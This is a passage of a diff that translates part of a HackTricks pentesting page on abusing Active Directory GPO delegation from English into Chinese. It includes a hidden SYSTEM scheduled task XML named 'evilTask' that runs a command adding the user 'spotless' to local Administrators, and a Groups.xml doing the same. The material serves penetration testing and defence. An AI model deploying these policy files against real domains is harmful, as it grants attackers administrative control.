-                        <LogonType>S4U</LogonType>
-                    </Principal>
-                </Principals>
-                <Settings>
-                    <IdleSettings>
-                        <Duration>PT10M</Duration>
-                        <WaitTimeout>PT1H</WaitTimeout>
-                        <StopOnIdleEnd>true</StopOnIdleEnd>
-                        <RestartOnIdle>false</RestartOnIdle>
-                    </IdleSettings>
-                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
-                    <AllowHardTerminate>false</AllowHardTerminate>
-                    <StartWhenAvailable>true</StartWhenAvailable>
-                    <AllowStartOnDemand>false</AllowStartOnDemand>
-                    <Enabled>true</Enabled>
-                    <Hidden>true</Hidden>
-                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-                    <Priority>7</Priority>
-                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
-                    <RestartOnFailure>
-                        <Interval>PT15M</Interval>
-                        <Count>3</Count>
-                    </RestartOnFailure>
-                </Settings>
-                <Actions Context="Author">
-                    <Exec>
-                        <Command>cmd</Command>
-                        <Arguments>/c net localgroup administrators spotless /add</Arguments>
-                    </Exec>
-                </Actions>
-                <Triggers>
-                    <TimeTrigger>
-                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
-                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
-                        <Enabled>true</Enabled>
-                    </TimeTrigger>
-                </Triggers>
-            </Task>
-        </Properties>
-    </ImmediateTaskV2>
+<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
+<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
+<Task version="1.3">
+<RegistrationInfo>
+<Author>NT AUTHORITY\System</Author>
+<Description></Description>
+</RegistrationInfo>
+<Principals>
+<Principal id="Author">
+<UserId>NT AUTHORITY\System</UserId>
+<RunLevel>HighestAvailable</RunLevel>
+<LogonType>S4U</LogonType>
+</Principal>
+</Principals>
+<Settings>
+<IdleSettings>
+<Duration>PT10M</Duration>
+<WaitTimeout>PT1H</WaitTimeout>
+<StopOnIdleEnd>true</StopOnIdleEnd>
+<RestartOnIdle>false</RestartOnIdle>
+</IdleSettings>
+<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+<AllowHardTerminate>false</AllowHardTerminate>
+<StartWhenAvailable>true</StartWhenAvailable>
+<AllowStartOnDemand>false</AllowStartOnDemand>
+<Enabled>true</Enabled>
+<Hidden>true</Hidden>
+<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+<Priority>7</Priority>
+<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
+<RestartOnFailure>
+<Interval>PT15M</Interval>
+<Count>3</Count>
+</RestartOnFailure>
+</Settings>
+<Actions Context="Author">
+<Exec>
+<Command>cmd</Command>
+<Arguments>/c net localgroup administrators spotless /add</Arguments>
+</Exec>
+</Actions>
+<Triggers>
+<TimeTrigger>
+<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
+<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
+<Enabled>true</Enabled>
+</TimeTrigger>
+</Triggers>
+</Task>
+</Properties>
+</ImmediateTaskV2>
 </ScheduledTasks>
 ```
 {% endcode %}
 
-### Users and Groups <a href="#users-and-groups" id="users-and-groups"></a>
+### 用户和组 <a href="#users-and-groups" id="users-and-groups"></a>
 
-The same privilege escalation could be achieved by abusing the GPO Users and Groups feature. Note in the below file, line 6 where the user `spotless` is added to the local `administrators` group - we could change the user to something else, add another one or even add the user to another group/multiple groups since we can amend the policy configuration file in the shown location due to the GPO delegation assigned to our user `spotless`:
+通过滥用GPO（组策略对象）的用户和组功能，也可以实现相同的权限提升。请注意下面的文件中，第6行将用户`spotless`添加到本地的`administrators`组 - 我们可以将用户更改为其他用户，添加另一个用户，甚至将用户添加到另一个组/多个组，因为我们可以修改显示位置的策略配置文件，这是由于我们的用户`spotless`被分配了GPO委派权限：
 
 {% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
 ```markup
 <?xml version="1.0" encoding="utf-8"?>
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
-    <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
-        <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
-            <Members>
-                <Member name="spotless" action="ADD" sid="" />
-            </Members>
-        </Properties>
-    </Group>
+<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
+<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
+<Members>
+<Member name="spotless" action="ADD" sid="" />
+</Members>
+</Properties>
+</Group>
 </Groups>
 ```
 {% endcode %}
 
-Additionally, we could think about leveraging logon/logoff scripts, using registry for autoruns, installing .msi, edit services and similar code execution avenues.
+此外，我们可以考虑利用登录/注销脚本，使用注册表进行自启动，安装.msi，编辑服务等方式进行代码执行。
 
-## References
+## 参考资料
 
-* Initially, this information was mostly copied from [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
+* 最初，这些信息主要来自于[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 * [https://wald0.com/?p=112](https://wald0.com/?p=112)
 * [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
 * [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
@@ -522,10 +532,10 @@ Additionally, we could think about leveraging logon/logoff scripts, using regist
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
